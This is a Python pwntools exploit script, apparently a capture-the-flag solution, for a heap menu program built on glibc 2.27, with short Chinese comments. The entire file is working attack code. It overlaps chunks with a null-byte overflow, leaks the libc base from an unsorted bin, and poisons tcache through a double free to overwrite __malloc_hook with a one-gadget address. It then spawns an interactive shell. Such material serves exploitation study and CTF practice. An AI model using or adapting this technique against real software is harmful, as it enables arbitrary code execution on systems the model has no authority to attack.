from PwnContext.core import *
binary = './program'
debug_libc = './libc-2.27.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 0

if local == 1 :
    p = remote('','')
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    p = ctx.start()

def create(size, content):
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('Size:', str(size))
    p.sendafter('Data:', content)


def show(index):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('Index:', str(index))


def delete(index):
    p.sendlineafter('Your choice: ', '3')
    p.sendlineafter('Index:', str(index))


create(0x500, 'a' * 0x4ff)
create(0x68, 'b' * 0x67) # 一个chunk进入tcachebin它的后一个chunk的inuse标志位不会置0
create(0x5f0, 'c' * 0x5ef)
create(0x20, 'd' * 0x20)
delete(1)
delete(0)
for i in range(7): #这里的目的是过掉前面加的da，每次循环清0一个字节
    create(0x68 - i, 'b' * (0x68 - i)) #第一次就是清0下一个chunk的inuse
    delete(0)
create(0x68, '1' * 0x60 + '\x80\x05')
delete(2)  #向前合并，unsortbin的头部位置不变
create(0x508, 'a' * 0x507)  #切割部分 目前下标为1
show(0)
data = u64(p.recv(6).ljust(8, '\x00'))
libc_base = data - 4111520
print 'libc_base :' + hex(libc_base)

create(0x68, '9' * 0x67)  #申请剩余的unsortbin，  目前下标为2
delete(0)
delete(2)   #两个tcache bin 指向自身了
malloc_addr = libc_base + libc.symbols['__malloc_hook']
one_addr = libc_base + 0x4f322
create(0x68, p64(malloc_addr) + 0x5f * 'a')
gdb.attach(p)
pause()
create(0x68, 'a' * 0x67) #要分配两次，因为是分配的之前去检测fd，把fd拿到tcacheentry去，再分配覆盖fd的
create(0x68, p64(one_addr))
print hex(malloc_addr)
p.sendlineafter('Your choice: ', '1')
p.sendlineafter('Size:', '10')
p.interactive()
